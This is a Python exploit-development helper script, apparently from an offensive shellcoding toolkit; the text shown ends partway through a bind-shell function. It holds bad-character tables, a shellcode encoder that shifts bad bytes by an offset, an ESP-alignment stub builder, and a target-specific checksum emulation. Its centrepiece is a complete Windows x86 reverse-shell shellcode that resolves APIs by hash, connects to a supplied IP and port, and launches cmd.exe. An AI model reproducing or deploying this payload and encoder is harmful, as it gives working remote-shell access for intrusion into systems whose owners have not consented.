#!/usr/bin/python3
import sys
from struct import pack, unpack
import argparse
import socket
import traceback
import time
import ipaddress
import select

# Global vars
host = None
port = None
sock = None

# Badchars
badchars = [ 0x0 , 0xa, 0xd]  
ropjunk = 0x60606060

# Timeouts
timeout = 5
socktimeout = 30
bufftimeout = 20

class Colors:
    """ ANSI color codes """
    BLACK = "\033[0;30m"
    RED = "\033[0;31m"
    GREEN = "\033[0;32m"
    BROWN = "\033[0;33m"
    BLUE = "\033[0;34m"
    PURPLE = "\033[0;35m"
    CYAN = "\033[0;36m"
    LIGHT_GRAY = "\033[0;37m"
    DARK_GRAY = "\033[1;30m"
    LIGHT_RED = "\033[1;31m"
    LIGHT_GREEN = "\033[1;32m"
    YELLOW = "\033[1;33m"
    LIGHT_BLUE = "\033[1;34m"
    LIGHT_PURPLE = "\033[1;35m"
    LIGHT_CYAN = "\033[1;36m"
    LIGHT_WHITE = "\033[1;37m"
    BOLD = "\033[1m"
    FAINT = "\033[2m"
    ITALIC = "\033[3m"
    UNDERLINE = "\033[4m"
    BLINK = "\033[5m"
    NEGATIVE = "\033[7m"
    CROSSED = "\033[9m"
    END = "\033[0m"
    # cancel SGR codes if we don't write to a terminal
    if not __import__("sys").stdout.isatty():
        for _ in dir():
            if isinstance(_, str) and _[0] != "_":
                locals()[_] = ""
    else:
        # set Windows console in VT mode
        if __import__("platform").system() == "Windows":
            kernel32 = __import__("ctypes").windll.kernel32
            kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)
            del kernel32

class Helpers:
    def scAlignASM(offsetsc):
        """
        Aligns ESP with a specified offset using ASM instructions. Supports both ADD and SUB operations.
        """
        max_add_byte = 0x7f   # Maximum value that can be added/subtracted in a single instruction
        strip_null = True     # Strip off NULL bytes when converting to hex

        # Byte definitions for ADD and SUB operations
        max_add_ax = b"\x66\x83\xc0\x7f"  # ADD AX, 0x7f (Maximum ADD AX value)
        prefix_add_ax = b"\x66\x83"       # Prefix for ADD AX
        prefix_sub_ax = b"\x66\x83\xc8"   # Prefix for SUB AX
        prefix_add_al = b"\x04"           # Prefix for ADD AL
        prefix_sub_al = b"\x2c"           # Prefix for SUB AL

        # Calculate optimal operation (ADD or SUB)
        use_addition = offsetsc >= 0      # Use ADD for positive offset, SUB for negative
        offset_abs = abs(offsetsc)

        # Calculate values for alignment
        num_max_instructions = offset_abs // max_add_byte  # Number of full 0x7f adjustments
        remaining_offset = offset_abs % max_add_byte       # Remaining offset to align

        # Create buffer of full max adjustments
        if use_addition:
            buf_max_instructions = max_add_ax * num_max_instructions
        else:
            buf_max_instructions = max_add_ax.replace(b"\xc0", b"\xc8") * num_max_instructions

        # Convert remaining offset to byte
        suffix_byte = Helpers.toByteHex(hex(remaining_offset), strip_null)[::-1]

        # Align buffer
        alignsc = b""
        alignsc += b"\x54"  # PUSH ESP
        alignsc += b"\x58"  # POP EAX
        alignsc += buf_max_instructions

        if remaining_offset > 0:
            if use_addition:
                alignsc += prefix_add_al + suffix_byte
            else:
                alignsc += prefix_sub_al + suffix_byte

        alignsc += b"\x50"  # PUSH EAX
        alignsc += b"\x5c"  # POP ESP

        return alignsc
    
    def colorBadbytes(originalsc, encodedsc):
        outsclines = []
        outrplines = []
        outwidth = 40
        lenhex = 4

        # Badchars
        badchars = Badchars.programbadchars
        
        # Convert badchar bytes to pretty "\x" encoded string
        prettyBadchars = Helpers.convertPrettyHex(badchars)
        # Already mapped during earlier calls; make sure to do so, if not
        mappedBadchars = Shellcode.mappedbadscchars

        # Strip per 4 chars for hex prefixed output
        bclines = [prettyBadchars[i:i + lenhex] for i in range(0, len(prettyBadchars), lenhex)]
        sclines = [originalsc[i:i + lenhex] for i in range(0, len(originalsc), lenhex)]
        eclines = [encodedsc[i:i + lenhex] for i in range(0, len(encodedsc), lenhex)]

        # Compare if badchars show up in shellcode and color if so
        # Check and color badchars
        outsclines.append("original_shellcode = (\n\tb\"")
        sccolor = ""
        for i, char in enumerate(sclines, 1):
            # Add bad char colored red
            if char in bclines:
                colorchar = Colors.RED + char + Colors.END
            else:
                colorchar = char
            
            sccolor += colorchar + ('"\n\tb"' if i % outwidth == 0 else '')

        outsclines.append(sccolor + "\"\n)\n")
        coloredsc = ''.join(outsclines)

        # Check and color replaced chars
        outrplines.append("encoded_shellcode = (\n\tb\"")
        sccolor = ""    
        for i, char in enumerate(eclines, 1):
            # Add replacement char colored green
            if i - 1 in mappedBadchars:
                colorchar = Colors.GREEN + char + Colors.END
            else:
                colorchar = char
            
            sccolor += colorchar + ('"\n\tb"' if i % outwidth == 0 else '')

        outrplines.append(sccolor + "\"\n)\n")
        coloredrp = ''.join(outrplines)      

        return coloredsc, coloredrp
    
    def encodeShellcode(sh,offsetEncoding):
        replacements = []
        badchars = Badchars.programbadchars
        for c in badchars:
            new = c + offsetEncoding
            if new < 0:
                new += 256
            replacements.append(new)
    
        print("[*] Badchars:     " + Colors.RED + Helpers.convertPrettyHex(badchars) + Colors.END)
        print("[*] Replacements: " + Colors.GREEN + Helpers.convertPrettyHex(replacements) + "\n" + Colors.END)
        badchars = bytes(badchars)
        replacements = bytes(replacements)

        transTable = sh.maketrans(badchars, replacements)
        encodedsh = sh.translate(transTable)
        hexencodedsh = Helpers.convertPrettyHex(encodedsh)
        Badchars.replacements = replacements
        
        return encodedsh,hexencodedsh

    def mapandconvertShellcode(selectedsc,offsetEncoding):
        # Program bad chars
        Badchars.programbadchars = badchars
        # Check shellcode and map bad characters
        Shellcode.mappedbadscchars = Helpers.mapBadChars(selectedsc)
        # Encode shellcode
        Shellcode.encodedShellcode,Shellcode.encodedShellcodeHex = Helpers.encodeShellcode(selectedsc,offsetEncoding)
        # Color characters for both original bad and encoded chars
        selectedschex = Helpers.convertPrettyHex(selectedsc)
        encodedschex = Shellcode.encodedShellcodeHex
        encodedsc = Shellcode.encodedShellcode
        coloredoriginalsc,coloredencodedsc = Helpers.colorBadbytes(selectedschex,encodedschex)
        print("Original shellcode: \n" + coloredoriginalsc)
        print("Encoded shellcode: \n" + coloredencodedsc)
        return encodedsc  

    def mapBadChars(sh):
        i = 0
        badIndex = []

        while i < len(sh):
            for c in badchars:
                if sh[i] == c:
                    badIndex.append(i)
            i=i+1
        return badIndex

    def containsBadchars(hexaddr, checkhalf=False):
        """
        Check if the 32-bit integer hex address contains any bad characters.
        """
        badchars = Badchars.programbadchars
        addr_size = 4  # bytes
        half_size = addr_size // 2  # 2 bytes
        half_mask = (1 << (half_size * 8)) - 1  # 0xFFFF for 2 bytes

        if checkhalf == 'upper':
            # upper 2 bytes: shift right 16 bits, mask lower 16 bits
            check_value = (hexaddr >> 16) & half_mask
            length = half_size
        elif checkhalf == 'lower':
            # lower 2 bytes: mask lower 16 bits directly
            check_value = hexaddr & half_mask
            length = half_size
        else:
            # full 4 bytes
            check_value = hexaddr
            length = addr_size

        for i in range(length):
            shift = (length - 1 - i) * 8
            b = (check_value >> shift) & 0xFF
            if b in badchars:
                print(f"[-] Error: bad character 0x{b:02x} in returned address 0x{hexaddr:08x}")
                return True
        return False

    def toByteHex(hexaddr,stripnull = False):
        """
        DESCR: Converts a hexaddress in stringformat to bytes
        IN: String hex address; 0x12345678
        OUT: Byte address
        """
        lenAddr = 8
        toByteHex = bytes.fromhex(hexaddr.lstrip('0x').rjust(lenAddr, '0'))
        if stripnull:
            toByteHex = toByteHex.lstrip(b"\x00")
        return toByteHex

    def convertPrettyHex(sh):
        """
        DESCR: Prefix each shellcode char with \\x
        IN: Shellcode
        OUT: \\x prefixed shellcode
        """
        hexencoded = "".join(map('\\x{:02x}'.format, sh))
        return hexencoded

    def negate(val, nbits=32):
        """
        Compute the two's complement negation of an integer within a specified bit-width.
        Args:
            val (int): The integer value to negate.
            nbits (int): The number of bits for the representation (default is 32 bits).
        Returns: int: The negated integer, wrapped within the specified bit-width.
        """
        return (val + (1 << nbits)) % (1 << nbits)

    def addhex(offset, nbits = 32):
        """
        Subtract/add enough bytes so hex address "loops" over ffffffff.
        Negate and return the result
        """
        largeVal = 0x88888888
        val = offset - largeVal
        return (val + (1 << nbits)) % (1 << nbits)

    def append_hex(a, b):
        """
        "Append" hex bytes to an existing value. E.g. add 0x123 to 0x564, results in 0x564123
        """
        sizeof_b = 0

        # get size of b in bits
        while((b >> sizeof_b) > 0):
            sizeof_b += 1

        # align answer to nearest 4 bits (hex digit)
        sizeof_b += sizeof_b % 4

        return (a << sizeof_b) | b

    def extract_and_accumulate_128bit_chunks(buffer,debug=False):
        """
        Simulates SIMD-like accumulation of 128-bit data chunks in an alternating pattern.
        Used in SSE or AVX code when processing data in parallel registers (xmm).
        """
        def add_128bit_lanes(a: int, b: int) -> int:
            # Convert to 16-byte little-endian
            a_bytes = a.to_bytes(16, 'little')
            b_bytes = b.to_bytes(16, 'little')
            result = bytearray()
            for i in range(0, 16, 4):
                lane_a = int.from_bytes(a_bytes[i:i+4], 'little')
                lane_b = int.from_bytes(b_bytes[i:i+4], 'little')
                lane_sum = (lane_a + lane_b) & 0xFFFFFFFF
                result += lane_sum.to_bytes(4, 'little')
            return int.from_bytes(result, 'little')

        startbit = 0x8
        chunk_size = 0x10
        num_chunks = (len(buffer) - startbit) // chunk_size

        chunks = []
        for i in range(num_chunks):
            offset = startbit + i * chunk_size
            part1 = int.from_bytes(buffer[offset:offset + startbit], 'little')
            part2 = int.from_bytes(buffer[offset + startbit:offset + chunk_size], 'little')
            full = (part2 << 64) | part1
            chunks.append(full)

        xmm2 = 0
        xmm1 = 0

        if debug:
            print("=== Iteration Log ===")
        for i, chunk in enumerate(chunks):
            if i % 2 == 0:
                xmm2 = add_128bit_lanes(xmm2, chunk)
            else:
                xmm1 = add_128bit_lanes(xmm1, chunk)

            if debug:
                print(f"XMM2: {xmm2.to_bytes(16, 'little')[::-1].hex()}")
                print(f"XMM1: {xmm1.to_bytes(16, 'little')[::-1].hex()}")

        print(f"Last XMM2: {xmm2.to_bytes(16, 'little')[::-1].hex()}")
        print(f"Last XMM1: {xmm1.to_bytes(16, 'little')[::-1].hex()}")
        return xmm2, xmm1

    def calculate_checksum(xmm1: int, xmm2: int) -> int:
        """
        Simulates a series of SIMD (Single Instruction, Multiple Data) operations used in SSE instructions. 
        It processes two 128-bit integers (xmm1 and xmm2) and returns a 32-bit checksum value.
        """
        def paddd(a: int, b: int) -> int:
            # 32-bit lane-wise addition
            a_bytes = a.to_bytes(16, 'little')
            b_bytes = b.to_bytes(16, 'little')
            result = bytearray()
            for i in range(0, 16, 4):
                lane_a = int.from_bytes(a_bytes[i:i+4], 'little')
                lane_b = int.from_bytes(b_bytes[i:i+4], 'little')
                lane_sum = (lane_a + lane_b) & 0xFFFFFFFF
                result += lane_sum.to_bytes(4, 'little')
            return int.from_bytes(result, 'little')

        def psrldq(val: int, byte_shift: int) -> int:
            # Logical right shift by N bytes
            val_bytes = val.to_bytes(16, 'little')
            shifted = val_bytes[byte_shift:] + b'\x00' * byte_shift
            return int.from_bytes(shifted, 'little')

        # Perform the sequence
        xmm1 = paddd(xmm1, xmm2)           # xmm1 += xmm2
        xmm0 = xmm1                        # xmm0 = xmm1
        xmm0 = psrldq(xmm0, 8)             # shift right by 8 bytes
        xmm1 = paddd(xmm1, xmm0)           # xmm1 += shifted xmm0
        xmm0 = xmm1
        xmm0 = psrldq(xmm0, 4)             # shift right by 4 bytes
        xmm1 = paddd(xmm1, xmm0)           # final add

        # Extract lowest 32 bits and XOR with static value in code
        checksum = (xmm1 & 0xffffffff) ^ 0x592AF351

        return checksum

    def keyboard_interrupt():
        """Handles keyboardinterrupt exceptions"""""
        print("\n\n[*] User requested an interrupt, exiting...")
        exit(0)

class Badchars:
    def programbadchars():
        i = 0
        programbadChars = []

        for c in badchars:
            programbadChars.append(i)
        return programbadChars
    
    def replacements():
        i = 0
        programbadscReplace = []

        for c in badchars:
            programbadscReplace.append(i)
        return programbadscReplace
    
    def allchars():
        chars = (
            b"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
            b"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
            b"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
            b"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
            b"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
            b"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
            b"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
            b"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" )
        return chars
    
    def defaultbadchars():
        # Not including "\x0a\x0d\x00"
        chars = (
            b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x0f\x10"
            b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
            b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
            b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
            b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
            b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
            b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
            b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
            b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
            b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
            b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
            b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
            b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
            b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
            b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
            b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" )
        return chars
    
    def custombadchars():
        # Not including "\x0a\x0d\x00\x25\x26\x27\x2b" 
        chars = (
            b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x0f\x10"
            b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
            b"\x21\x22\x23\x24\x28\x29\x2a\x2c\x2d\x2e\x2f\x30"
            b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
            b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
            b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
            b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
            b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
            b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
            b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
            b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
            b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
            b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
            b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
            b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
            b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" )
        return chars    
        
    def asciiprintchars():
        # Printable ASCII characters
        chars = (
            b"\x20"
            b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
            b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
            b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
            b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
            b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
            b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f")
        return chars    
    
class Shellcode:
    def asmrevshellShellcode(revip,revport):
        # Custom revshell, hacky port and ip vars
        # Generated using https://raw.githubusercontent.com/hodor-sec/Shellcoding/master/generic/asm_assemble_disassemble.py
        
        # Validate inputs
        if not revip or not revport:
            print("[!] Error: Empty IP address or port entered for payload. Exiting...")
            sys.exit(0)
        try:
            # Convert IP address to bytes
            ip = int(ipaddress.IPv4Address(revip)).to_bytes(4, byteorder='big')
        except ipaddress.AddressValueError:
            print(f"[!] Error: Invalid IP address '{revip}'. Exiting...")
            sys.exit(0)

        if not (1 <= revport <= 65535):
            print(f"[!] Error: Invalid port '{revport}'. Must be between 1 and 65535. Exiting...")
            sys.exit(0)

        # Convert port to bytes
        port = revport.to_bytes(2, byteorder='big')  # Port is always 2 bytes in network byte order

        # Generate assembly for IP and Port
        asmip = b"\x68" + ip  # push IP
        asmport = b"\x66\xb8" + port  # mov ax, PORT
        
        shellcode = (
                b"\x89\xe5"                        # 0x0         mov  ebp, esp
                b"\x81\xc4\xf0\xf9\xff\xff"        # 0x2         add  esp, 0xfffff9f0
                b"\x31\xc9"                        # 0x8         xor  ecx, ecx
                b"\x64\x8b\x71\x30"                # 0x10        mov  esi, dword ptr fs:[ecx + 0x30]
                b"\x8b\x76\x0c"                    # 0x14        mov  esi, dword ptr [esi + 0xc]
                b"\x8b\x76\x1c"                    # 0x17        mov  esi, dword ptr [esi + 0x1c]
                b"\x8b\x5e\x08"                    # 0x20        mov  ebx, dword ptr [esi + 8]
                b"\x8b\x7e\x20"                    # 0x23        mov  edi, dword ptr [esi + 0x20]
                b"\x8b\x36"                        # 0x26        mov  esi, dword ptr [esi]
                b"\x66\x39\x4f\x18"                # 0x28        cmp  word ptr [edi + 0x18], cx
                b"\x75\xf2"                        # 0x32        jne  0x14
                b"\xeb\x06"                        # 0x34        jmp  0x2a
                b"\x5e"                            # 0x36        pop  esi
                b"\x89\x75\x04"                    # 0x37        mov  dword ptr [ebp + 4], esi
                b"\xeb\x54"                        # 0x40        jmp  0x7e
                b"\xe8\xf5\xff\xff\xff"            # 0x42        call 0x24
                b"\x60"                            # 0x47        pushal
                b"\x8b\x43\x3c"                    # 0x48        mov  eax, dword ptr [ebx + 0x3c]
                b"\x8b\x7c\x03\x78"                # 0x51        mov  edi, dword ptr [ebx + eax + 0x78]
                b"\x01\xdf"                        # 0x55        add  edi, ebx
                b"\x8b\x4f\x18"                    # 0x57        mov  ecx, dword ptr [edi + 0x18]
                b"\x8b\x47\x20"                    # 0x60        mov  eax, dword ptr [edi + 0x20]
                b"\x01\xd8"                        # 0x63        add  eax, ebx
                b"\x89\x45\xfc"                    # 0x65        mov  dword ptr [ebp - 4], eax
                b"\xe3\x36"                        # 0x68        jecxz0x7c
                b"\x49"                            # 0x70        dec  ecx
                b"\x8b\x45\xfc"                    # 0x71        mov  eax, dword ptr [ebp - 4]
                b"\x8b\x34\x88"                    # 0x74        mov  esi, dword ptr [eax + ecx*4]
                b"\x01\xde"                        # 0x77        add  esi, ebx
                b"\x31\xc0"                        # 0x79        xor  eax, eax
                b"\x99"                            # 0x81        cdq
                b"\xfc"                            # 0x82        cld
                b"\xac"                            # 0x83        lodsbal, byte ptr [esi]
                b"\x84\xc0"                        # 0x84        test al, al
                b"\x74\x07"                        # 0x86        je   0x5f
                b"\xc1\xca\x0d"                    # 0x88        ror  edx, 0xd
                b"\x01\xc2"                        # 0x91        add  edx, eax
                b"\xeb\xf4"                        # 0x93        jmp  0x53
                b"\x3b\x54\x24\x24"                # 0x95        cmp  edx, dword ptr [esp + 0x24]
                b"\x75\xdf"                        # 0x99        jne  0x44
                b"\x8b\x57\x24"                    # 0x101       mov  edx, dword ptr [edi + 0x24]
                b"\x01\xda"                        # 0x104       add  edx, ebx
                b"\x66\x8b\x0c\x4a"                # 0x106       mov  cx, word ptr [edx + ecx*2]
                b"\x8b\x57\x1c"                    # 0x110       mov  edx, dword ptr [edi + 0x1c]
                b"\x01\xda"                        # 0x113       add  edx, ebx
                b"\x8b\x04\x8a"                    # 0x115       mov  eax, dword ptr [edx + ecx*4]
                b"\x01\xd8"                        # 0x118       add  eax, ebx
                b"\x89\x44\x24\x1c"                # 0x120       mov  dword ptr [esp + 0x1c], eax
                b"\x61"                            # 0x124       popal
                b"\xc3"                            # 0x125       ret
                b"\x68\x83\xb9\xb5\x78"            # 0x126       push 0x78b5b983
                b"\xff\x55\x04"                    # 0x131       call dword ptr [ebp + 4]
                b"\x89\x45\x10"                    # 0x134       mov  dword ptr [ebp + 0x10], eax
                b"\x68\x8e\x4e\x0e\xec"            # 0x137       push 0xec0e4e8e
                b"\xff\x55\x04"                    # 0x142       call dword ptr [ebp + 4]
                b"\x89\x45\x14"                    # 0x145       mov  dword ptr [ebp + 0x14], eax
                b"\x68\x72\xfe\xb3\x16"            # 0x148       push 0x16b3fe72
                b"\xff\x55\x04"                    # 0x153       call dword ptr [ebp + 4]
                b"\x89\x45\x18"                    # 0x156       mov  dword ptr [ebp + 0x18], eax
                b"\x31\xc0"                        # 0x159       xor  eax, eax
                b"\x66\xb8\x6c\x6c"                # 0x161       mov  ax, 0x6c6c
                b"\x50"                            # 0x165       push eax
                b"\x68\x33\x32\x2e\x64"            # 0x166       push 0x642e3233
                b"\x68\x77\x73\x32\x5f"            # 0x171       push 0x5f327377
                b"\x54"                            # 0x176       push esp
                b"\xff\x55\x14"                    # 0x177       call dword ptr [ebp + 0x14]
                b"\x89\xc3"                        # 0x180       mov  ebx, eax
                b"\x68\xcb\xed\xfc\x3b"            # 0x182       push 0x3bfcedcb
                b"\xff\x55\x04"                    # 0x187       call dword ptr [ebp + 4]
                b"\x89\x45\x1c"                    # 0x190       mov  dword ptr [ebp + 0x1c], eax
                b"\x68\xd9\x09\xf5\xad"            # 0x193       push 0xadf509d9
                b"\xff\x55\x04"                    # 0x198       call dword ptr [ebp + 4]
                b"\x89\x45\x20"                    # 0x201       mov  dword ptr [ebp + 0x20], eax
                b"\x68\x0c\xba\x2d\xb3"            # 0x204       push 0xb32dba0c
                b"\xff\x55\x04"                    # 0x209       call dword ptr [ebp + 4]
                b"\x89\x45\x24"                    # 0x212       mov  dword ptr [ebp + 0x24], eax
                b"\x31\xdb"                        # 0x215       xor  ebx, ebx
                b"\x66\xbb\x90\x01"                # 0x217       mov  bx, 0x190
                b"\x29\xdc"                        # 0x221       sub  esp, ebx
                b"\x54"                            # 0x223       push esp
                b"\x83\xc3\x72"                    # 0x224       add  ebx, 0x72
                b"\x53"                            # 0x227       push ebx
                b"\xff\x55\x1c"                    # 0x228       call dword ptr [ebp + 0x1c]
                b"\x31\xc0"                        # 0x231       xor  eax, eax
                b"\x50"                            # 0x233       push eax
                b"\x50"                            # 0x234       push eax
                b"\x50"                            # 0x235       push eax
                b"\xb0\x06"                        # 0x236       mov  al, 6
                b"\x50"                            # 0x238       push eax
                b"\x2c\x05"                        # 0x239       sub  al, 5
                b"\x50"                            # 0x241       push eax
                b"\x40"                            # 0x242       inc  eax
                b"\x50"                            # 0x243       push eax
                b"\xff\x55\x20"                    # 0x244       call dword ptr [ebp + 0x20]
                b"\x89\xc6"                        # 0x247       mov  esi, eax
                b"\x31\xc0"                        # 0x249       xor  eax, eax
                b"\x50"                            # 0x251       push eax
                b"\x50"                            # 0x252       push eax
                b"" + asmip + b""
                b"" + asmport + b""
                b"\xc1\xe0\x10"                    # 0x262       shl  eax, 0x10
                b"\x66\x83\xc0\x02"                # 0x265       add  ax, 2
                b"\x50"                            # 0x269       push eax
                b"\x54"                            # 0x270       push esp
                b"\x5f"                            # 0x271       pop  edi
                b"\x31\xc0"                        # 0x272       xor  eax, eax
                b"\x50"                            # 0x274       push eax
                b"\x50"                            # 0x275       push eax
                b"\x50"                            # 0x276       push eax
                b"\x50"                            # 0x277       push eax
                b"\x04\x10"                        # 0x278       add  al, 0x10
                b"\x50"                            # 0x280       push eax
                b"\x57"                            # 0x281       push edi
                b"\x56"                            # 0x282       push esi
                b"\xff\x55\x24"                    # 0x283       call dword ptr [ebp + 0x24]
                b"\x56"                            # 0x286       push esi
                b"\x56"                            # 0x287       push esi
                b"\x56"                            # 0x288       push esi
                b"\x31\xc0"                        # 0x289       xor  eax, eax
                b"\x50"                            # 0x291       push eax
                b"\x50"                            # 0x292       push eax
                b"\xb8\xfe\xfe\xff\xff"            # 0x293       mov  eax, 0xfffffefe
                b"\xf7\xd8"                        # 0x298       neg  eax
                b"\x50"                            # 0x300       push eax
                b"\x31\xc0"                        # 0x301       xor  eax, eax
                b"\x50"                            # 0x303       push eax
                b"\x50"                            # 0x304       push eax
                b"\x50"                            # 0x305       push eax
                b"\x50"                            # 0x306       push eax
                b"\x50"                            # 0x307       push eax
                b"\x50"                            # 0x308       push eax
                b"\x50"                            # 0x309       push eax
                b"\x50"                            # 0x310       push eax
                b"\x50"                            # 0x311       push eax
                b"\x50"                            # 0x312       push eax
                b"\xb0\x44"                        # 0x313       mov  al, 0x44
                b"\x50"                            # 0x315       push eax
                b"\x54"                            # 0x316       push esp
                b"\x5f"                            # 0x317       pop  edi
                b"\xb8\x9b\x87\x9a\xff"            # 0x318       mov  eax, 0xff9a879b
                b"\xf7\xd8"                        # 0x323       neg  eax
                b"\x50"                            # 0x325       push eax
                b"\x68\x63\x6d\x64\x2e"            # 0x326       push 0x2e646d63
                b"\x54"                            # 0x331       push esp
                b"\x5b"                            # 0x332       pop  ebx
                b"\x89\xe0"                        # 0x333       mov  eax, esp
                b"\x31\xc9"                        # 0x335       xor  ecx, ecx
                b"\x66\x81\xc1\x90\x03"            # 0x337       add  cx, 0x390
                b"\x29\xc8"                        # 0x342       sub  eax, ecx
                b"\x50"                            # 0x344       push eax
                b"\x57"                            # 0x345       push edi
                b"\x31\xc0"                        # 0x346       xor  eax, eax
                b"\x50"                            # 0x348       push eax
                b"\x50"                            # 0x349       push eax
                b"\x50"                            # 0x350       push eax
                b"\x40"                            # 0x351       inc  eax
                b"\x50"                            # 0x352       push eax
                b"\x48"                            # 0x353       dec  eax
                b"\x50"                            # 0x354       push eax
                b"\x50"                            # 0x355       push eax
                b"\x53"                            # 0x356       push ebx
                b"\x50"                            # 0x357       push eax
                b"\xff\x55\x18"                    # 0x358       call dword ptr [ebp + 0x18]
                b"\x31\xc9"                        # 0x361       xor  ecx, ecx
                b"\x51"                            # 0x363       push ecx
                b"\x6a\xff"                        # 0x364       push -1
                b"\xff\x55\x10"                    # 0x366       call dword ptr [ebp + 0x10]
        )
        return shellcode

    def asmbindshellcode(hostport, hostip = False):
        # Custom bindshell, hacky port and ip vars
        # Generated using https://raw.githubusercontent.com/hodor-sec/Shellcoding/master/generic/asm_assemble_disassemble.py
        # Validate port
        if not hostport or not (1 <= hostport <= 65535):
            print(f"[!] Error: Invalid or missing port '{hostport}'. Port must be between 1 and 65535. Exiting...")
            sys.exit(0)

        # Handle IP address
        try:
            if hostip:
                ip = int(ipaddress.IPv4Address(hostip)).to_bytes(4, byteorder='big')
            else:
                # Default to listening on all interfaces
                ip = int(ipaddress.IPv4Address("0.0.0.0")).to_bytes(4, byteorder='big')
